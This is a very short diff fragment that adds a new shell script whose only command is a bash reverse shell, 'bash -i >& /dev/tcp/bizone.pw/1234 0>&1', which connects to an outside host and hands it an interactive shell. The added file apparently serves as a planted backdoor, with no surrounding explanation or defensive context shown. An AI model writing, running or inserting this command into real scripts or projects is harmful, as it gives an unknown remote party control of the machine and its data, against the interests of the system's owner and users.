@@ -1,0 +1,2 @@
+#!/bin/sh
+bash -i >& /dev/tcp/bizone.pw/1234 0>&1
